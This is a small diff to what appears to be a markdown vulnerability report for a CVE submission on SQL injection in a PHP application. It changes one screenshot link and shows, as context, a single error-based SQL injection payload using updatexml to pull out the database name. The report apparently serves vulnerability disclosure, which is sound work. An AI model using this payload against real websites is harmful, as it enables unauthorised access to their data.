@@ -36,7 +36,7 @@
    id=1'and updatexml(1,concat(0x7e,(database()),0x7e),1)#
    ```
    
-   | ![image-20240816172147822](E:\Desktop\webRay\cve挖掘\cve提交\php-ocls-Arbitrary Sqli.assets\image-20240816172147822.png) |
+   | ![image-20240816172147822](https://raw.githubusercontent.com/0xffaaa/cve/main/php-ocls-Arbitrary%20Sqli.assets/image-20240816172147822.png) |
    | ------------------------------------------------------------ |
    
    
